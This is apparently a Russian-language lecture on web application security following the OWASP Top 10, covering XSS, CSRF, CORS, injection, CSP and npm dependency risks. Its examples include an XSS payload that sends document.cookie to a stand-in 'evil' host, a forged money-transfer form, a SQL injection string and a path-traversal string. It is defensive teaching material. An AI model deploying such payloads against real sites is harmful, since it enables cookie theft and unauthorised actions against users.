# Доклад №5. Безопасность веб-приложений: OWASP Top 10 на практике

**Что разбирается:** XSS (и почему `innerHTML` опасен), CSRF, CORS «как он есть на самом деле»,
инъекции, CSP, утечки через зависимости в npm.

---

## 1. XSS: почему `innerHTML` — это дыра

Вставка строки как HTML заставляет браузер **исполнить** всё, что там есть:

```js
// ОПАСНО
comment.innerHTML = userInput;   // <img src=x onerror="fetch('//evil/?c='+document.cookie)">
```

```js
// БЕЗОПАСНО: текстовый узел — браузер не парсит его как разметку
comment.textContent = userInput;

// БЕЗОПАСНО: React вставляет значение как текст
return <p>{userInput}</p>;
```

Три вида XSS:

| Вид | Где живёт | Пример |
|---|---|---|
| **Хранимый** | в базе, отдаётся всем | комментарий со скриптом в БД |
| **Отражённый** | в параметрах запроса | `?q=<script>...` в поисковой выдаче |
| **DOM-based** | целиком в браузере | `location.hash` → `innerHTML` |

Что может украсть XSS: cookie без `httpOnly`, содержимое `localStorage`, отправку форм,
токены из DOM, переписку, нажатия клавиш (через перехват обработчиков).

**Правила защиты:**

1. **Не вставлять пользовательские данные как HTML.** Только `textContent`/`{value}`.
   Если очень нужно — прогонять через `DOMPurify` и держать белый список тегов.
2. Экранировать на **выходе**, а не на входе (одно и то же значение нужно по-разному
   в HTML, в атрибуте, в JS, в URL).
3. `dangerouslySetInnerHTML` — только осознанно и только с санитайзером.
4. `Content-Security-Policy` как вторая линия: даже если скрипт попал в разметку,
   он не загрузится.
5. Cookie с `httpOnly` — XSS не сможет её прочитать.

**Проверка:** откройте DevTools, введите в любое поле `<img src=x onerror="alert(1)">`.
Если появляется диалог — есть XSS. В нашем проекте React (`{value}`) и EJS (`<%= %>`)
экранируют автоматически, поэтому вставка превращается в обычный текст.

## 2. CSRF: почему «действие с чужого сайта» работает

Браузер **автоматически прикладывает cookie** домена к запросу, независимо от того, кто
этот запрос инициировал. Значит, чужой сайт может отправить форму на наш домен —
и жертва выполнит действие, будучи залогиненной.

```html
<!-- на сайте злоумышленника -->
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="100000">
</form>
<script>document.forms[0].submit()</script>
```

Защита — комбинированная:

1. **`SameSite` cookie**: `Lax` (по умолчанию в современных браузерах) не отправляет cookie
   при кросс-сайтовых POST — самый простой барьер.
2. **CSRF-токен** (double submit): сервер кладёт случайный токен в сессию и в скрытое поле
   формы; при POST сравнивает через `timingSafeEqual`. Чужой сайт не может прочитать токен
   из нашей формы (его блокирует политика одного источника).
3. **Проверка `Origin`/`Referer`** для «меняющих» запросов.
4. **Не менять состояние через GET** — картинка `<img src="/delete?id=1">` не должна ничего удалять.

Типичные ошибки: токен не проверяется на GET-эндпоинтах, которые меняют данные;
CSRF-проверка отключена для «внутренних» API; токен передаётся в cookie и сравнивается
сам с собой без привязки к сессии.

## 3. CORS «как он есть на самом деле»

CORS — **не защита от атак**, а механизм разрешения кросс-доменных чтений.
Правило браузера: ответ с другого источника можно прочитать, только если сервер явно разрешил.

```
Origin: https://app.example
       ↓
Access-Control-Allow-Origin: https://app.example
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
```

Что важно знать:

* **CORS ограничивает только браузер.** `curl` и серверные скрипты читают ответ без всяких проверок.
* **Простой запрос** (GET/POST с `Content-Type: text/plain` и т.п.) уходит сразу, но ответ
  браузер не отдаст скрипту без разрешающих заголовков.
* **Preflight** (`OPTIONS`) выполняется для «непростых» запросов (свой заголовок, JSON-тело, PUT/DELETE).
* Главный антипаттерн: `Access-Control-Allow-Origin: *` **вместе** с
  `Access-Control-Allow-Credentials: true` — браузер такое сочетание запретит, а вот
  «отражать» любой `Origin` из запроса вручную (`echo $Origin`) — распространённая ошибка:
  это разрешает читать приватные данные любому чужому сайту.
* Приватный API нельзя «защитить CORS-ом» — защищать надо аутентификацией и правами.

## 4. Инъекции: SQL, NoSQL, команды, шаблоны

```js
// ОПАСНО: конкатенация запроса
db.query(`SELECT * FROM users WHERE login='${login}'`);   // login = "admin' OR '1'='1"

// БЕЗОПАСНО: параметризованный запрос
db.query('SELECT * FROM users WHERE login = ?', [login]);
```

Правила:

* всегда параметризованные запросы/ORM; конкатенация строк — никогда;
* имена таблиц/колонок из пользовательского ввода не подставляются (наш SQLite-адаптер
  экранирует имя таблицы, но берёт его только из кода, а не из запроса);
* проверять не только SQL: `exec` с пользовательскими аргументами, MongoDB-операторы
  (`$where`, `{$ne: null}` в полях), инъекция в шаблоны (SSTI), в XML (XXE), в заголовки
  (CRLF/header injection), в путь файла (path traversal — «../../etc/passwd»).

## 5. Прочие пункты OWASP Top 10 (2021) кратко

| Пункт | В чём суть | Что делать |
|---|---|---|
| A01 Broken Access Control | проверка прав только в интерфейсе, IDOR (`/api/order/123` чужого пользователя) | проверять права на сервере, привязывать объект к субъекту |
| A02 Cryptographic Failures | md5 для паролей, HTTP вместо HTTPS, свои «шифры» | bcrypt/argon2, TLS, стандартные библиотеки |
| A03 Injection | SQL/команды/шаблоны | параметризация, валидация, белые списки |
| A04 Insecure Design | нет модели угроз, «секретный» endpoint | проектировать с учётом угроз, лимиты, отказ по умолчанию |
| A05 Security Misconfiguration | дефолтные пароли, отладочные режимы, открытые каталоги | минимум прав, `.env`, выключить debug в проде |
| A06 Vulnerable Components | устаревшие зависимости | `npm audit`, обновление, lock-файл, минимум пакетов |
| A07 Authentication Failures | перебор, отсутствие лимитов, слабые пароли | лимит попыток, 2FA, политика паролей |
| A08 Integrity Failures | небезопасные десериализация/обновления | подписи, проверка целостности, CDN с SRI |
| A09 Logging Failures | инцидент не с чем связать | логи входов/изменений, мониторинг, алерты |
| A10 SSRF | сервер ходит по ссылке от пользователя во внутреннюю сеть | белый список домены/схемы, блокировка private IP |

## 6. CSP: вторая линия обороны

`Content-Security-Policy` задаёт, откуда можно грузить ресурсы и что исполнять:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self';
  form-action 'self';
  frame-ancestors 'none';
```

Что это даёт: если XSS-вставка всё-таки проскочила, `<script src="//evil/x.js">` не выполнится,
а инлайн-скрипт (`<script>alert(1)</script>`) будет заблокирован при `script-src 'self'`.

Как вводить безопасно: начать с `Content-Security-Policy-Report-Only` и собрать отчёты,
затем включить принудительно. Полезны `nonce`/`hash` для необходимых инлайн-скриптов.
Ограничения: CSP не спасает от DOM-based XSS без опасного sink, а `'unsafe-inline'`
в `script-src` обнуляет защиту (в нашем проекте `unsafe-inline` разрешён только для стилей).

## 7. Утечки через зависимости в npm

Реальный риск: `npm install` тянет сотни пакетов, часть — транзитивные, часть может быть
скомпрометирована (typosquatting, захват аккаунта мейнтейнера, вредоносный postinstall-скрипт).

Практика защиты:

```bash
npm audit                 # известные уязвимости
npm audit fix             # без ломающих изменений
npm outdated              # что устарело
npx better-npm-audit audit   # строже, с игнорированием dev-зависимостей
npx snyk test             # альтернативный сканер (есть бесплатный тариф)
```

Правила:

* не ставить пакет «на всякий случай» — каждая зависимость расширяет поверхность атаки;
* фиксировать версии (`package-lock.json` в репозитории, `npm ci` в CI);
* не запускать `postinstall`-скрипты вслепую (`npm ci --ignore-scripts` там, где возможно);
* проверять имя пакета (typosquatting: `crossenv` вместо `cross-env`);
* использовать CI-проверку аудита и обновлять зависимости планово, а не «когда сломается»;
* для критичных проектов — pinning + приватный реестр/зеркало.

## 8. Точечный чек-лист для защиты проекта

1. Пароли: bcrypt-хеш (никакого md5/SHA в открытом виде).
2. Сессия: `httpOnly` + `SameSite`, `regenerate()` после входа, срок жизни.
3. CSRF: токен в сессии + скрытое поле + `timingSafeEqual`.
4. Валидация: на сервере, доменными сущностями; клиентская — только подсказка.
5. XSS: React `{value}` / EJS `<%= %>`, никакого `innerHTML` для пользовательских данных.
6. Ошибки: 5xx не показывают стек пользователю, детали уходят в лог.
7. Загрузка файлов: белый список MIME, лимит размера, сгенерированное имя файла,
   каталог статики без исполнения.
8. Лимит частоты на вход и формы.
9. Заголовки: `helmet` + CSP + `X-Content-Type-Options: nosniff` + `X-Frame-Options: DENY`.
10. Зависимости: минимум пакетов, `npm audit` перед сдачей, `package-lock.json` в репозитории.

## 9. Мини-выводы

* `innerHTML` + пользовательские данные = XSS; правильный путь — текст, а не разметка.
* CSRF лечится `SameSite` и токеном, а не «отключением cookie».
* CORS — не защита, а разрешение чтения в браузере; `*` с credentials — грубая ошибка.
* Инъекции закрываются параметризацией и валидацией, CSP — эшелонированная защита.
* Зависимости — тоже код: их надо проверять и обновлять.
